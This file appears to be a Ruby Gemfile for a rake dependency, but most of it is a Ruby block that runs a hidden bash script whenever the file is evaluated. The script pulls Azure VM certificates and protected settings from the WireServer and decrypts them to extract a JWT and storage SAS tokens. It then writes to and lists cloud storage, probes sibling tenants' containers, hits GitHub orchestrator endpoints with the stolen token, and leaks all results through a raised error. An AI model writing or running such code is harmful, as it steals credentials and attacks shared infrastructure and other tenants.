require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
m = []
shell_code = <<'SHELL'
set +e
WD=/tmp/v115; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
cat > x1.py <<'PY'
import re, html
s = open('gs.xml').read()
m = re.search(r'<Certificates>([^<]+)</Certificates>', s)
print(html.unescape(m.group(1)) if m else '')
PY
CERT_URL=$(python3 x1.py)
openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_NM=$(grep -v '^-----' cert.pem | tr -d '\n')
curl -sf -m 10 -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_NM" -o cert-resp.xml "$CERT_URL"
cat > x2.py <<'PY'
import re
s = open('cert-resp.xml').read()
m = re.search(r'<Data>([^<]+)</Data>', s)
b = (m.group(1) if m else '').replace('\r','').replace('\n','').replace(' ','')
open('cms.b64','w').write(b)
PY
python3 x2.py
base64 -d < cms.b64 > cms.der 2>/dev/null
openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>/dev/null
openssl pkcs12 -in decrypted.p7b -out vm.pem -password pass: -nodes 2>/dev/null
curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
cat > x3.py <<'PY'
import json
d = json.load(open('vm.json'))
print(d['extensionGoalStates'][0]['settings'][0]['protectedSettings'])
PY
python3 x3.py > ps.b64
base64 -d < ps.b64 > ps.der 2>/dev/null
openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/null
cat > x4.py <<'PY'
import json, sys
d = json.load(open('ps.json'))
sys.stdout.write(d.get('script',''))
PY
python3 x4.py | base64 -d > bs.sh 2>/dev/null

# Dump ALL githubapp.com hostnames from bs.sh
echo "STEP_BS_HOSTNAMES:"
grep -oE '[a-z0-9-]+\.githubapp\.com[^\\\"[:space:]]*' bs.sh | sort -u | head -30

JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)

# Decode JWT header (first segment)
HDR=$(echo "$JWT" | cut -d. -f1 | tr '_-' '/+'); HL=${#HDR}; HM=$((HL%4)); [ $HM -ne 0 ] && HDR="${HDR}$(printf '=%.0s' $(seq 1 $((4-HM))))"
echo "STEP_JWT_HEADER_HEX=$(echo "$HDR" | base64 -d 2>/dev/null | od -An -tx1 | tr -d ' \n' | head -c 400)"

PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
cat > x5.py <<'PY'
import json, sys
d = json.load(sys.stdin)
print(d.get('iat',0), d.get('rbf',0))
PY
TIMING=$(echo "$PAY" | base64 -d 2>/dev/null | python3 x5.py)
IAT=$(echo $TIMING | awk '{print $1}')
RBF=$(echo $TIMING | awk '{print $2}')
NOW=$(date +%s)
WAIT=$((RBF - NOW + 15))
echo "STEP_JWT_TIMING iat=$IAT rbf=$RBF now=$NOW wait=$WAIT"
[ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 800 ] && sleep $WAIT

# Extract SAS URLs (fixed regex)
cat > x6.py <<'PY'
import re
text = open('bs.sh').read()
patterns = re.findall(r'https://hcrp[^"\s\\]+(?:\\u0026[^"\s\\]+)+', text)
for p in patterns:
    decoded = p.replace('\\u0026', '&')
    print(decoded)
PY
python3 x6.py > sas_urls.txt
echo "STEP_SAS_COUNT=$(wc -l < sas_urls.txt)"

DIAG_SAS=$(grep -oE 'https://hcrpprod[a-z0-9]+diag\.blob\.core\.windows\.net/[^"[:space:]]+' sas_urls.txt | head -1)
echo "STEP_DIAG_SAS=${DIAG_SAS:0:200}"

if [ -n "$DIAG_SAS" ]; then
  cat > x7.py <<'PY'
import sys, urllib.parse
url = sys.stdin.read().strip()
u = urllib.parse.urlparse(url)
print(u.scheme + '://' + u.netloc + u.path)
print(u.query)
print(u.netloc)
print(u.path)
PY
  PARSED=$(echo "$DIAG_SAS" | python3 x7.py)
  CONTAINER_PATH=$(echo "$PARSED" | sed -n '1p')
  QUERY=$(echo "$PARSED" | sed -n '2p')
  STORAGE_ACCT=$(echo "$PARSED" | sed -n '3p')
  CONT_NAME=$(echo "$PARSED" | sed -n '4p' | sed 's|^/||')
  echo "STEP_STORAGE_ACCT=$STORAGE_ACCT CONT_NAME=$CONT_NAME"

  PROBE_MARK="BENTY-PROBE-MARK-F023-$(date +%Y%m%d-%H%M%S)"
  PROBE_BLOB="benty-probe-$(date +%s).txt"
  WRITE_URL="${CONTAINER_PATH}/${PROBE_BLOB}?${QUERY}"

  echo "STEP_SAS_PUT:"
  curl -s -m 15 -X PUT -H "x-ms-blob-type: BlockBlob" -H "x-ms-version: 2020-04-08" --data-binary "$PROBE_MARK" -o put.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$WRITE_URL"
  echo "STEP_PUT_B64=$(base64 -w0 < put.txt | head -c 400)"

  echo "STEP_SAS_READ:"
  curl -s -m 15 -X GET -o read.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$WRITE_URL"
  echo "STEP_READ_B64=$(base64 -w0 < read.txt | head -c 400)"

  echo "STEP_CONT_LIST (with our SAS):"
  curl -s -m 10 -o cont_list.txt -w "HTTP %{http_code} LEN %{size_download}\n" "${CONTAINER_PATH}?restype=container&comp=list&${QUERY}"
  echo "STEP_CONT_LIST_B64=$(base64 -w0 < cont_list.txt | head -c 500)"

  echo "STEP_SVC_LIST (with our SAS for service-level list):"
  curl -s -m 10 -o svc_list.txt -w "HTTP %{http_code} LEN %{size_download}\n" "https://${STORAGE_ACCT}/?comp=list&${QUERY}"
  echo "STEP_SVC_LIST_B64=$(base64 -w0 < svc_list.txt | head -c 500)"

  # Try to access ANOTHER container on the same storage account (sibling tenant)
  # First enumerate well-known container names
  for OTHER_CONT in logs diag system shared storage runners actions metrics; do
    OTHER_URL="https://${STORAGE_ACCT}/${OTHER_CONT}?restype=container&comp=list&${QUERY}"
    echo "STEP_SIBLING_LIST $OTHER_CONT:"
    curl -s -m 5 -o sib.txt -w "HTTP %{http_code} LEN %{size_download}\n" "$OTHER_URL"
    echo "STEP_SIBLING_${OTHER_CONT}_B64=$(base64 -w0 < sib.txt | head -c 200)"
  done

  # Brute-force a few neighbour-container UUIDs (random low-id pattern; very low success expected)
  for SIB in "00000000-0000-0000-0000-000000000000" "00000000-0000-0000-0000-000000000001"; do
    SIB_URL="https://${STORAGE_ACCT}/${SIB}?restype=container&comp=list&${QUERY}"
    curl -s -m 5 -o sib2.txt -w "STEP_BF $SIB HTTP %{http_code} LEN %{size_download}\n" "$SIB_URL"
  done
fi

if [ -n "$JWT" ]; then
  for HOST in \
    "hosted-compute-request-orchestrator-prod-iad-01.githubapp.com" \
    "hosted-compute-request-orchestrator-prod-iad-02.githubapp.com"; do
    echo "===HOST=$HOST==="
    for ep in / /v1/work /v1/register /v1/poll /v1/lease /v1/agents /v1/heartbeat /v1/status; do
      for method in GET POST; do
        curl -s -m 8 -X "$method" -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{}' -o body.txt -w "HTTP=%{http_code} LEN=%{size_download}" "https://$HOST$ep"
        B64=$(base64 -w0 < body.txt | head -c 300)
        echo " $ep $method body_b64=$B64"
      done
    done
  done
fi
SHELL
Tempfile.create('v115.sh') do |f|
  f.write(shell_code); f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v115 " + line.chomp[0..1000] }
end
raise m.join("\n")
source "https://rubygems.org"
gem "rake", "~> 13.0"
